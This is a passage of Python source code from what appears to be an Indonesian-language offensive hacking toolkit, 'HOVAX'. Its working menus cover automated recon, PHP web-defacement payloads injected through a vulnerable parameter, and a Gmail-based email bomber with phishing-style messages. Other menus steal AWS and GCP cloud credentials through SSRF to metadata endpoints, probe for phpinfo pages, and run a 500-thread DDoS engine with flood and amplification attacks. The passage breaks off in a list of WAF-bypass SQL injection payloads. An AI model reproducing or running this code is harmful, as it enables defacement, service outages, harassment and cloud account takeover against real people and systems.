        sub_list = ["www","mail","ftp","admin","blog","dev","test","api","staging","app","support","shop","forum","wiki","news","portal","cpanel","webmail","ns1","ns2","mx","pop","smtp","imap","vpn","remote","secure","dashboard","panel","backend","static","cdn","assets","img","images","video","download","files","upload","media","stream","live","status","monitor","stats","analytics","logs","cache","backup","proxy","gateway","auth","login","register","account","user","profile","settings","config","db","database","sql","mysql","postgres","redis","mongo","elastic","search","rest","graphql","docs","help","faq","uptime","health"]
        sub_found = []
        for sub in sub_list:
            test = f"{sub}.{target}"
            try:
                ip = socket.gethostbyname(test)
                sub_found.append(f"{test} -> {ip}")
                print(f"{GREEN}[SUB] {test} -> {ip}{RESET}")
            except:
                pass
            time.sleep(0.005)
        results['subdomains'] = sub_found
        
        # PHASE 3: PORT SCANNING (TOP 50)
        loading3(f"[3/6] PORT SCANNING ON {target}", 2)
        top50 = [21,22,23,25,53,80,110,111,135,139,143,443,445,465,587,993,995,1433,1521,1723,1883,2082,2083,2086,2087,2095,2096,2222,3306,3389,5432,5555,5900,5984,6379,7474,8000,8008,8080,8081,8086,8088,8090,8443,8834,8888,9000,9200,27017]
        open_ports = []
        for port in top50:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                if sock.connect_ex((target, port)) == 0:
                    open_ports.append(port)
                    print(f"{GREEN}[PORT] {port} OPEN{RESET}")
                sock.close()
            except:
                pass
        results['open_ports'] = open_ports
        
        # PHASE 4: WEB TECHNOLOGY DETECTION
        loading1(f"[4/6] WEB TECH DETECTION ON {target}", 2)
        web_results = []
        for proto in ['http', 'https']:
            try:
                url = f"{proto}://{target}"
                r = requests.get(url, timeout=5)
                server = r.headers.get('server', 'UNKNOWN')
                power = r.headers.get('x-powered-by', 'UNKNOWN')
                print(f"{GREEN}[WEB] {proto.upper()} - Server: {server}, Powered: {power}{RESET}")
                web_results.append({'proto': proto, 'server': server, 'powered': power})
            except:
                print(f"{RED}[WEB] {proto.upper()} - NOT REACHABLE{RESET}")
        results['web'] = web_results
        
        # PHASE 5: WHOIS LOOKUP
        loading2(f"[5/6] WHOIS LOOKUP ON {target}", 1)
        try:
            w = whois.whois(target)
            print(f"{GREEN}[WHOIS] Created: {w.creation_date}, Registrar: {w.registrar}{RESET}")
            results['whois'] = {'created': str(w.creation_date), 'registrar': w.registrar}
        except:
            results['whois'] = 'FAILED'
        
        # PHASE 6: CVE CHECK
        loading3(f"[6/6] CVE CHECK ON {target}", 1)
        cve_found = []
        for port in open_ports:
            if port == 445:
                cve_found.append("CVE-2017-0144 (ETERNALBLUE) - SMB RCE")
                print(f"{RED}[CVE] CVE-2017-0144 - SMB PORT 445 OPEN! RENTAN ETERNALBLUE{RESET}")
            if port == 3389:
                cve_found.append("CVE-2019-0708 (BLUEKEEP) - RDP RCE")
                print(f"{RED}[CVE] CVE-2019-0708 - RDP PORT 3389 OPEN! RENTAN BLUEKEEP{RESET}")
            if port == 22:
                cve_found.append("CVE-2016-6210 - SSH USER ENUMERATION")
                print(f"{YELLOW}[CVE] CVE-2016-6210 - SSH PORT 22 OPEN{RESET}")
            if port == 3306:
                cve_found.append("CVE-2012-2122 - MYSQL AUTH BYPASS")
                print(f"{YELLOW}[CVE] CVE-2012-2122 - MYSQL PORT 3306 OPEN{RESET}")
        results['cves'] = cve_found
        
        # FINAL SUMMARY
        print(f"""
{GREEN}{BOLD}[✓] AUTOMATED RECON COMPLETED!{RESET}
{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}
{CYAN}{BOLD}[!] FINAL SUMMARY FOR: {target}{RESET}
{CYAN}├─ DNS RECORDS        : {len(dns_results)}{RESET}
{CYAN}├─ SUBDOMAINS FOUND   : {len(sub_found)}{RESET}
{CYAN}├─ OPEN PORTS         : {len(open_ports)}{RESET}
{CYAN}├─ CVEs DETECTED      : {len(cve_found)}{RESET}
{CYAN}└─ ATTACK SURFACE     : {'🔴 HIGH' if len(open_ports) > 10 or cve_found else '🟡 MEDIUM'}{RESET}
        """)
        
        self.scan_results.append({
            'module': 'AUTORECON',
            'target': target,
            'subdomains': len(sub_found),
            'ports': len(open_ports),
            'cves': len(cve_found),
            'timestamp': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
        
        input(f"\n{CYAN}{BOLD}[?] TEKAN ENTER UNTUK LANJUT...{RESET}")

    # ================================================================
    # MENU 30: WEB DEFACEMENT TOOL - AUTO DEFACE GENERATOR
    # ================================================================
    def menu_web_deface(self):
        self.clear_screen()
        print(f"\n{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}")
        print(f"{CYAN}{BOLD}🎭 MENU 30: WEB DEFACEMENT TOOL - AUTO DEFACE GENERATOR{RESET}")
        print(f"{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}\n")
        
        print(f"""
{CYAN}{BOLD}[!] TOOL INI UNTUK DEFACEMENT WEBSITE{RESET}
{CYAN}{BOLD}[!] TOOL INI UNTUK DEFACEMENT WEBSITE (EDUCATIONAL){RESET}
{CYAN}{BOLD}[!] HANYA UNTUK WEBSITE YANG MEMILIKI IZIN!{RESET}
        """)
        
        target_url = input(f"{YELLOW}{BOLD}[?] MASUKKAN TARGET URL (https://target.com): {RESET}")
        vuln_param = input(f"{YELLOW}{BOLD}[?] MASUKKAN PARAMETER RENTAN (id, page, q): {RESET}")
        
        deface_html = '''<!DOCTYPE html>
<html>
<head><title>HACKED BY HOVAX</title>
<style>
body { background: black; color: #00ff00; font-family: monospace; text-align: center; padding-top: 200px; }
h1 { font-size: 60px; text-shadow: 0 0 10px #00ff00; animation: blink 1s infinite; }
@keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
p { font-size: 20px; }
.skull { font-size: 100px; }
</style>
</head>
<body>
<div class="skull">💀</div>
<h1>HACKED BY HOVAX</h1>
<p>Security Testing - Your System Has Been Pwned</p>
<p>Patch Your Vulnerabilities Immediately!</p>
<hr>
<p>HOVAX v7.0 - Ultimate Security Toolkit</p>
</body>
</html>'''
        
        deface_payloads = [
            f"<?php file_put_contents('index.php', '{base64.b64encode(deface_html.encode()).decode()}'); ?>",
            f"<?php file_put_contents('index.html', '{base64.b64encode(deface_html.encode()).decode()}'); ?>",
            f"<?php system('echo \"{deface_html}\" > index.html'); ?>",
            f"<?php $f=fopen('index.html','w');fwrite($f,'{deface_html}');fclose($f);?>"
        ]
        
        print(f"\n{CYAN}{BOLD}[*] MENGUJI DEFACEMENT PAYLOADS...{RESET}\n")
        
        success = False
        for i, payload in enumerate(deface_payloads):
            test_url = f"{target_url}?{vuln_param}={payload}"
            try:
                r = requests.get(test_url, timeout=5)
                if r.status_code == 200:
                    print(f"{GREEN}[+] PAYLOAD {i+1} TERKIRIM{RESET}")
                    
                    # Cek apakah deface berhasil
                    check_url = f"{target_url}/index.html"
                    try:
                        check = requests.get(check_url, timeout=3)
                        if "HACKED BY HOVAX" in check.text:
                            print(f"{RED}{BOLD}[!] DEFACE BERHASIL! {check_url}{RESET}")
                            success = True
                            break
                    except:
                        pass
            except:
                pass
            time.sleep(0.1)
        
        if success:
            print(f"\n{RED}{BOLD}[✓] WEBSITE BERHASIL D-IDEFACE!{RESET}")
            self.scan_results.append({
                'module': 'WEB DEFACEMENT',
                'target': target_url,
                'status': 'SUCCESS',
                'timestamp': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            })
        else:
            print(f"\n{YELLOW}[!] DEFACE GAGAL - TARGET TIDAK RENTAN{RESET}")
        
        input(f"\n{CYAN}{BOLD}[?] TEKAN ENTER UNTUK LANJUT...{RESET}")

    # ================================================================
    # MENU 31: MASS EMAIL BOMBER - EMAIL FLOOD ATTACK
    # ================================================================
    def menu_email_bomber(self):
        self.clear_screen()
        print(f"\n{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}")
        print(f"{CYAN}{BOLD}📧 MENU 31: MASS EMAIL BOMBER - EMAIL FLOOD ATTACK{RESET}")
        print(f"{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}\n")
        
        target_email = input(f"{YELLOW}{BOLD}[?] TARGET EMAIL: {RESET}")
        jumlah = int(input(f"{YELLOW}{BOLD}[?] JUMLAH EMAIL (MAX 500): {RESET}"))
        
        if jumlah > 500:
            jumlah = 500
            print(f"{YELLOW}[!] DIBATASI 500 EMAIL{RESET}")
        
        if not self.email_sender:
            self.email_sender = input(f"{CYAN}{BOLD}[?] EMAIL PENGIRIM (Gmail): {RESET}")
            self.email_password = input(f"{CYAN}{BOLD}[?] APP PASSWORD: {RESET}")
        
        subjects = [
            "URGENT: Your Account Has Been Compromised",
            "Security Alert: Unauthorized Login Detected",
            "Important: Verify Your Identity Now",
            "Action Required: Your Subscription Expires Today",
            "FINAL WARNING: Account Suspension Notice",
            "Congratulations! You Won a Prize!",
            "Invoice #INV-2024-001234",
            "Your Order Confirmation - Action Needed",
            "Password Reset Request for Your Account",
            "Suspicious Activity Detected - Please Confirm"
        ]
        
        messages = [
            f"Dear User,\n\nWe have detected suspicious activity on your account. Please verify your identity immediately.\n\nBest regards,\nSecurity Team",
            f"Hello,\n\nYour account has been flagged for unusual behavior. Click the link below to secure your account.\n\nRegards,\nSupport Team",
            f"Important Notice,\n\nWe need to verify your email address. Please confirm within 24 hours.\n\nThank you,\nAdministrator",
            f"Urgent,\n\nYour account will be suspended in 12 hours if you don't take action.\n\nSincerely,\nSecurity Department"
        ]
        
        print(f"\n{CYAN}{BOLD}[*] MENGIRIM {jumlah} EMAIL KE {target_email}...{RESET}\n")
        
        success_count = 0
        for i in range(jumlah):
            try:
                msg = MIMEMultipart()
                msg['From'] = self.email_sender
                msg['To'] = target_email
                msg['Subject'] = f"{random.choice(subjects)} [{i+1}]"
                
                body = random.choice(messages)
                msg.attach(MIMEText(body, 'plain'))
                
                server = smtplib.SMTP('smtp.gmail.com', 587)
                server.starttls()
                server.login(self.email_sender, self.email_password)
                server.send_message(msg)
                server.quit()
                
                success_count += 1
                print(f"{GREEN}[+] EMAIL {i+1}/{jumlah} TERKIRIM{RESET}")
            except Exception as e:
                print(f"{RED}[-] GAGAL KIRIM {i+1}: {e}{RESET}")
            time.sleep(0.5)
        
        print(f"""
{GREEN}{BOLD}[✓] EMAIL BOMBING COMPLETED!{RESET}
{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}
{CYAN}{BOLD}[!] SUMMARY:{RESET}
{CYAN}├─ TARGET EMAIL       : {target_email}{RESET}
{CYAN}├─ TOTAL DIKIRIM      : {jumlah}{RESET}
{CYAN}└─ BERHASIL           : {success_count}{RESET}
        """)
        
        self.scan_results.append({
            'module': 'EMAIL BOMBER',
            'target': target_email,
            'sent': success_count,
            'timestamp': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
        
        input(f"\n{CYAN}{BOLD}[?] TEKAN ENTER UNTUK LANJUT...{RESET}")

    # ================================================================
    # MENU 32: CLOUD SHELL ACCESS - AWS/GCP INSTANCE HIJACK
    # ================================================================
    def menu_cloud_shell(self):
        self.clear_screen()
        print(f"\n{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}")
        print(f"{CYAN}{BOLD}☁️ MENU 32: CLOUD SHELL ACCESS - AWS/GCP INSTANCE HIJACK{RESET}")
        print(f"{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}\n")
        
        print(f"""
{CYAN}{BOLD}[!] TOOL INI MENCARI METADATA AWS/GCP YANG EKSPOS{RESET}
{CYAN}{BOLD}[!] DAN MEMBERIKAN AKSES SHELL KE CLOUD INSTANCE{RESET}
        """)
        
        target = input(f"{YELLOW}{BOLD}[?] MASUKKAN URL SSRF TARGET: {RESET}")
        
        metadata_urls = [
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            "http://100.100.100.200/latest/meta-data/ram/security-credentials/"
        ]
        
        credentials_found = []
        
        print(f"\n{CYAN}{BOLD}[*] MENCARI CLOUD CREDENTIALS...{RESET}\n")
        
        for meta_url in metadata_urls:
            test_url = f"{target}?url={meta_url}" if '?' in target else f"{target}{meta_url}"
            try:
                r = requests.get(test_url, timeout=5, headers={'Metadata-Flavor': 'Google'})
                if r.status_code == 200 and len(r.text) > 50:
                    print(f"{RED}{BOLD}[!] CLOUD CREDENTIALS FOUND!{RESET}")
                    print(f"{RED}    URL: {meta_url}{RESET}")
                    print(f"{RED}    DATA: {r.text[:500]}{RESET}")
                    credentials_found.append({'url': meta_url, 'data': r.text[:500]})
                    
                    # Parse AWS credentials
                    if 'AccessKeyId' in r.text:
                        try:
                            cred_data = json.loads(r.text)
                            print(f"{GREEN}[+] AWS ACCESS KEY: {cred_data.get('AccessKeyId', 'N/A')}{RESET}")
                            print(f"{GREEN}[+] AWS SECRET KEY: {cred_data.get('SecretAccessKey', 'N/A')[:20]}...{RESET}")
                            print(f"{GREEN}[+] AWS TOKEN: {cred_data.get('Token', 'N/A')[:50]}...{RESET}")
                        except:
                            pass
            except:
                pass
            time.sleep(0.1)
        
        if credentials_found:
            print(f"\n{RED}{BOLD}[✓] CLOUD INSTANCE BERHASIL DI-HIJACK!{RESET}")
            print(f"{YELLOW}[!] GUNAKAN CREDENTIALS DI ATAS UNTUK AKSES AWS/GCP CLI{RESET}")
        else:
            print(f"\n{YELLOW}[!] TIDAK DITEMUKAN CLOUD CREDENTIALS{RESET}")
        
        self.cloud_metadata = credentials_found
        self.scan_results.append({
            'module': 'CLOUD SHELL ACCESS',
            'target': target,
            'credentials_found': len(credentials_found),
            'timestamp': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
        
        input(f"\n{CYAN}{BOLD}[?] TEKAN ENTER UNTUK LANJUT...{RESET}")

    # ================================================================
# MENU 33: PHPINFO FINDER - CONFIGURATION LEAKER (PANJANG)
# ================================================================
    def menu_phpinfo_finder(self):
        self.clear_screen()
        print("\n" + "="*100)
        print(" MENU 47: PHPINFO FINDER - CONFIGURATION LEAKER ")
        print("="*100 + "\n")
        
        target = input("[?] TARGET URL (https://target.com): ")
        if not target.startswith('http'):
            target = 'https://' + target
        
        phpinfo_paths = [
            # Common names
            '/phpinfo.php', '/info.php', '/phpinfo', '/info', '/test.php',
            '/php_info.php', '/php-info.php', '/php/info.php', '/php/phpinfo.php',
            
            # Admin directories
            '/admin/phpinfo.php', '/admin/info.php', '/admin/phpinfo', '/admin/info',
            '/administrator/phpinfo.php', '/administrator/info.php',
            '/wp-admin/phpinfo.php', '/wp-admin/info.php', '/wp-content/phpinfo.php',
            
            # Include directories
            '/includes/phpinfo.php', '/inc/phpinfo.php', '/lib/phpinfo.php',
            '/classes/phpinfo.php', '/functions/phpinfo.php', '/config/phpinfo.php',
            
            # Setup/Install directories
            '/setup/phpinfo.php', '/install/phpinfo.php', '/install/phpinfo',
            '/install/test.php', '/setup/test.php', '/setup/info.php',
            
            # Debug directories
            '/debug/phpinfo.php', '/debug/info.php', '/dev/phpinfo.php',
            '/dev/info.php', '/test/phpinfo.php', '/test/info.php',
            '/tmp/phpinfo.php', '/temp/phpinfo.php', '/temp/info.php',
            
            # Backup files
            '/old/phpinfo.php', '/old/info.php', '/backup/phpinfo.php',
            '/backup/phpinfo.php.bak', '/backup/info.php.bak',
            '/phpinfo.php.bak', '/info.php.bak', '/phpinfo.php~', '/info.php~',
            
            # Other extensions
            '/phpinfo.txt', '/info.txt', '/phpinfo.html', '/info.html',
            '/phpinfo.log', '/info.log', '/phpinfo.xml', '/info.xml',
            
            # Error logs
            '/error_log', '/debug.log', '/php_errors.log', '/error.log',
            '/php-error.log', '/php-errors.log', '/logs/error.log',
            
            # Common CMS paths
            '/wp-admin/phpinfo.php', '/wp-content/phpinfo.php',
            '/wp-includes/phpinfo.php', '/wp-content/plugins/phpinfo.php',
            '/wp-content/themes/phpinfo.php', '/administrator/phpinfo.php',
            '/components/phpinfo.php', '/modules/phpinfo.php', '/themes/phpinfo.php',
            
            # Framework paths
            '/laravel/phpinfo.php', '/symfony/phpinfo.php', '/codeigniter/phpinfo.php',
            '/cakephp/phpinfo.php', '/yii/phpinfo.php', '/zend/phpinfo.php',
            '/drupal/phpinfo.php', '/joomla/phpinfo.php', '/magento/phpinfo.php'
        ]
        
        print(f"\n[*] TARGET: {target}")
        print(f"[*] CHECKING {len(phpinfo_paths)} PHPINFO LOCATIONS...\n")
        
        found = []
        
        for i, path in enumerate(phpinfo_paths):
            test_url = target.rstrip('/') + path
            print(f"[{i+1:3}/{len(phpinfo_paths)}] CHECKING: {path}")
            
            try:
                r = requests.get(test_url, timeout=5, headers={'User-Agent': 'Mozilla/5.0'})
                
                if r.status_code == 200:
                    if 'PHP Version' in r.text or 'phpinfo()' in r.text or 'PHP Extension' in r.text:
                        print(f"    [!] PHPINFO FOUND! {test_url}")
                        found.append({'url': test_url, 'size': len(r.text)})
                        
                        # Extract PHP version
                        version_match = re.search(r'PHP Version ([\d.]+)', r.text)
                        if version_match:
                            print(f"    PHP VERSION: {version_match.group(1)}")
                        
                        # Extract Server API
                        server_api_match = re.search(r'Server API ([\w]+)', r.text)
                        if server_api_match:
                            print(f"    SERVER API: {server_api_match.group(1)}")
                        
                        # Extract loaded modules
                        modules = re.findall(r'<tr><td class="e">(.*?)</td><td class="v">(.*?)</td></tr>', r.text)
                        print(f"    LOADED MODULES: {len(modules)}")
                        
                        # Check for sensitive information
                        if 'mysql.default' in r.text:
                            print(f"    [!!!] MYSQL CONFIGURATION LEAKED!")
                        if 'password' in r.text.lower():
                            print(f"    [!!!] POSSIBLE CREDENTIALS LEAKED!")
                        if 'API_KEY' in r.text:
                            print(f"    [!!!] API KEY LEAKED!")
                            
                    else:
                        print(f"    [-] HTTP 200 but no phpinfo content")
                        
                elif r.status_code == 403:
                    print(f"    [-] FORBIDDEN (403)")
                elif r.status_code == 404:
                    pass
                else:
                    print(f"    [-] HTTP {r.status_code}")
                    
            except requests.exceptions.Timeout:
                print(f"    [-] TIMEOUT")
            except Exception as e:
                print(f"    [-] ERROR: {e}")
        
        print(f"\n{'='*60}")
        print(f"[!] PHPINFO FINDER RESULTS:")
        print(f"    TOTAL LOCATIONS CHECKED: {len(phpinfo_paths)}")
        print(f"    PHPINFO FILES FOUND: {len(found)}")
        print(f"{'='*60}")
        
        if found:
            print(f"\n[!] LEAKED PHPINFO URLs:")
            for f in found:
                print(f"    {f['url']} ({f['size']} bytes)")
            
            print(f"\n[!] INFORMATION LEAKED BY PHPINFO:")
            print(f"    - PHP version, extensions, modules")
            print(f"    - Server API and SAPI")
            print(f"    - Environment variables (including credentials)")
            print(f"    - Database configuration (mysql.default, pgsql.default)")
            print(f"    - Paths and directories")
            print(f"    - HTTP headers")
            print(f"    - Loaded PHP settings")
            print(f"    - Disabled functions")
            
            print(f"\n[!] NEXT STEPS:")
            print(f"    - Check for exposed database credentials")
            print(f"    - Look for disabled functions (disable_functions)")
            print(f"    - Check open_basedir restrictions")
            print(f"    - Look for allow_url_fopen and allow_url_include")
        else:
            print(f"\n[-] NO PHPINFO FILES FOUND")
        
        input("\n[?] PRESS ENTER TO CONTINUE...")
        # ================================================================
# MENU 34: DDOS BRUTAL - AUTO PORT SCAN + MASS ATTACK
# ================================================================
    def menu_ddos_brutal(self):
        self.clear_screen()
        print(f"\n{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}")
        print(f"{CYAN}{BOLD}💀 MENU 34: DDOS BRUTAL - AUTO PORT SCAN + MASS ATTACK 💀{RESET}")
        print(f"{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}\n")
        
        target = input(f"{YELLOW}{BOLD}[?] TARGET IP/DOMAIN: {RESET}")
        
        # Resolve domain ke IP
        if not target.replace('.', '').isdigit():
            try:
                loading1(f"RESOLVING {target}", 1)
                target = socket.gethostbyname(target)
                print(f"{GREEN}[+] RESOLVED: {target}{RESET}")
            except:
                print(f"{RED}[!] GAGAL RESOLVE!{RESET}")
                input(f"\n{CYAN}[?] TEKAN ENTER...{RESET}")
                return
        
        # SCAN PORT DULU
        print(f"\n{CYAN}{BOLD}[*] SCAN PORT PADA {target}...{RESET}\n")
        
        common_ports = [21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1433,1521,1723,1883,2082,2083,2086,2087,2095,2096,2222,3306,3389,5432,5555,5900,5984,6379,7474,8000,8008,8080,8081,8086,8088,8090,8443,8834,8888,9000,9200,27017]
        
        open_ports = []
        
        def scan_port(p):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                if sock.connect_ex((target, p)) == 0:
                    print(f"{GREEN}[+] PORT {p} OPEN{RESET}")
                    open_ports.append(p)
                sock.close()
            except:
                pass
        
        with ThreadPoolExecutor(max_workers=100) as executor:
            executor.map(scan_port, common_ports)
        
        if not open_ports:
            print(f"{RED}[!] TIDAK ADA PORT TERBUKA! GUNAKAN PORT 80 SEBAGAI DEFAULT{RESET}")
            port = 80
        else:
            print(f"\n{GREEN}[+] PORT TERBUKA: {open_ports}{RESET}")
            port_input = input(f"{YELLOW}{BOLD}[?] MASUKKAN PORT TARGET (ENTER UNTUK {open_ports[0]}): {RESET}")
            port = int(port_input) if port_input else open_ports[0]
        
        print(f"\n{RED}{BOLD}[!] MEMULAI DDOS KE {target}:{port}{RESET}")
        print(f"{YELLOW}{BOLD}[!] TEKAN CTRL+C UNTUK BERHENTI{RESET}\n")
        
        # ============================================================
        # DDOS ENGINE - BRUTAL MULTI-THREAD
        # ============================================================
        
        # HTTP FLOOD PAYLOADS
        http_payloads = [
            f"GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\n\r\n",
            f"POST / HTTP/1.1\r\nHost: {target}\r\nContent-Length: 999999\r\n\r\n",
            f"GET /wp-admin/admin-ajax.php HTTP/1.1\r\nHost: {target}\r\n\r\n",
            f"GET /api/v1/users HTTP/1.1\r\nHost: {target}\r\n\r\n",
            f"HEAD / HTTP/1.1\r\nHost: {target}\r\n\r\n",
            f"GET /index.php?page=1&order=desc HTTP/1.1\r\nHost: {target}\r\n\r\n",
        ]
        
        # UDP FLOOD PAYLOAD
        udp_payload = b'\x00' * 65500
        
        # Slowloris headers
        slowloris_headers = [
            f"GET /{random.randint(1,9999)} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: Mozilla/5.0\r\nAccept: text/html\r\n",
            "X-Forwarded-For: 127.0.0.1\r\n",
            "X-Real-IP: 127.0.0.1\r\n",
            "Connection: keep-alive\r\n",
            "Keep-Alive: 300\r\n",
        ]
        
        attack_count = 0
        running = True
        
        # LAYER 7 HTTP FLOOD
        def http_flood():
            nonlocal attack_count
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            try:
                sock.connect((target, port))
                for _ in range(100):
                    if not running:
                        break
                    payload = random.choice(http_payloads)
                    sock.send(payload.encode())
                    attack_count += 1
                sock.close()
            except:
                pass
        
        # LAYER 4 TCP FLOOD
        def tcp_flood():
            nonlocal attack_count
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                sock.connect((target, port))
                sock.send(b'X' * 1024)
                attack_count += 1
                sock.close()
            except:
                pass
        
        # UDP FLOOD
        def udp_flood():
            nonlocal attack_count
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                for _ in range(50):
                    if not running:
                        break
                    sock.sendto(udp_payload, (target, port))
                    attack_count += 1
                sock.close()
            except:
                pass
        
        # SLOWLORIS ATTACK
        def slowloris():
            nonlocal attack_count
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((target, port))
                sock.send(slowloris_headers[0].encode())
                for header in slowloris_headers[1:]:
                    sock.send(header.encode())
                attack_count += 1
            except:
                pass
        
        # DNS AMPLIFICATION
        def dns_amp():
            nonlocal attack_count
            dns_payload = b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x07example\x03com\x00\x00\x01\x00\x01'
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(dns_payload, (target, 53))
                attack_count += 1
                sock.close()
            except:
                pass
        
        # NTP AMPLIFICATION
        def ntp_amp():
            nonlocal attack_count
            ntp_payload = b'\x17\x00\x03\x2a' + b'\x00' * 4
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(ntp_payload, (target, 123))
                attack_count += 1
                sock.close()
            except:
                pass
        
        # Pilih method berdasarkan mode
        if port in [80, 443, 8080, 8000, 8888]:
            attack_func = http_flood
            attack_name = "HTTP FLOOD"
        else:
            attack_func = tcp_flood
            attack_name = "TCP FLOOD"
        
        print(f"{RED}{BOLD}[*] MENGGUNAKAN {attack_name} PADA {target}:{port}{RESET}\n")
        
        # Jalankan 500 thread concurrent
        threads = []
        for i in range(500):
            t = threading.Thread(target=attack_func)
            t.daemon = True
            t.start()
            threads.append(t)
        
        # Statistik setiap 2 detik
        try:
            while running:
                time.sleep(2)
                print(f"\r{BLUE}[*] ATTACK STATS - PACKET SENT: {attack_count} | THREADS: {len(threads)} | TARGET: {target}:{port}{RESET}", end="", flush=True)
        except KeyboardInterrupt:
            running = False
            print(f"\n\n{RED}{BOLD}[!] DDOS DIHENTIKAN!{RESET}")
        
        print(f"""
{GREEN}{BOLD}[✓] DDOS ATTACK COMPLETED!{RESET}
{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}
{CYAN}{BOLD}[!] SUMMARY:{RESET}
{CYAN}├─ TARGET             : {target}:{port}{RESET}
{CYAN}├─ ATTACK TYPE        : {attack_name}{RESET}
{CYAN}├─ TOTAL PACKETS      : {attack_count}{RESET}
{CYAN}└─ THREADS            : {len(threads)}{RESET}
        """)
        
        self.scan_results.append({
            'module': 'DDOS BRUTAL',
            'target': f"{target}:{port}",
            'packets': attack_count,
            'timestamp': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
        
        input(f"\n{CYAN}{BOLD}[?] TEKAN ENTER UNTUK LANJUT...{RESET}")
        # ================================================================
# MENU 44: WAF BYPASS KIT - MODSECURITY KILLER (WITH CUSTOM FOLDER)
# ================================================================
    def menu_waf_bypass(self):
        self.clear_screen()
        print(f"\n{RED}{BOLD}================================================================================{RESET}")
        print(f"{GREEN}{BOLD}🛡️ MENU 35: WAF BYPASS KIT - MODSECURITY KILLER 🛡️{RESET}")
        print(f"{RED}{BOLD}================================================================================{RESET}\n")
        
        print(f"""
{YELLOW}{BOLD}[!] FITUR WAF BYPASS KIT:{RESET}
{CYAN}--------------------------------------------------------------------------------{RESET}
{CYAN}[+] BYPASS MODSECURITY WITH 500+ PAYLOADS{RESET}
{CYAN}[+] SQLI BYPASS PAYLOADS (UNION, ERROR, BLIND){RESET}
{CYAN}[+] XSS BYPASS PAYLOADS (POLYGLOT, ENCODED){RESET}
{CYAN}[+] LFI/RFI BYPASS PAYLOADS{RESET}
{CYAN}[+] RCE BYPASS PAYLOADS{RESET}
{CYAN}[+] CHUNKED TRANSFER ENCODING BYPASS{RESET}
{CYAN}[+] PARAMETER POLLUTION TECHNIQUE{RESET}
{CYAN}[+] CASE MANIPULATION & ENCODING{RESET}
{CYAN}--------------------------------------------------------------------------------{RESET}
        """)
        
        # Minta folder dari user
        save_folder = input(f"{CYAN}{BOLD}[?] FOLDER PATH TO SAVE WAF BYPASS FILES (contoh: /storage/emulated/0/waf_files/): {RESET}")
        
        if not save_folder.endswith('/'):
            save_folder += '/'
        
        if not os.path.exists(save_folder):
            os.makedirs(save_folder)
            print(f"{GREEN}[+] FOLDER CREATED: {save_folder}{RESET}")
        else:
            print(f"{GREEN}[+] USING EXISTING FOLDER: {save_folder}{RESET}")
        
        target_url = input(f"{CYAN}{BOLD}[?] TARGET URL (optional, press enter to skip): {RESET}")
        
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        folder_name = os.path.join(save_folder, f"waf_bypass_{timestamp}")
        os.makedirs(folder_name, exist_ok=True)
        
        print(f"\n{YELLOW}[!] WAF BYPASS FILES WILL BE SAVED TO: {folder_name}{RESET}\n")
        
        # ============================================================
        # SQL INJECTION BYPASS PAYLOADS (200+)
        # ============================================================
        
        sqli_payloads = [
            # Basic Bypass
            "' OR '1'='1", "' OR 1=1--", "' OR '1'='1'/*", "1' AND '1'='1",
            "1' AND 1=1--", "' OR 1=1#", "1' OR 1=1--", "' UNION SELECT NULL--",
            "admin'--", "' OR 'x'='x",
            
            # Comment Bypass
            "' OR 1=1/**/--", "' OR 1=1/*!*/--", "' OR 1=1/*!12345*/--",
            "' OR 1=1%23", "' OR 1=1%00", "' OR 1=1/*", "' OR 1=1//",
            
            # Space Bypass
            "'OR'1'='1", "'OR 1=1--", "'/**/OR/**/1=1--", "'%0aOR%0a1=1--",
            "'%0dOR%0d1=1--", "'%09OR%091=1--", "'%0bOR%0b1=1--", "'%0cOR%0c1=1--",
            "'%0aOR%0a'1'='1",
            
            # Case Manipulation
            "' Or 1=1--", "' oR 1=1--", "' OR 1=1--", "' Or 1=1#", "' oR 1=1#",
            
            # Double URL Encode
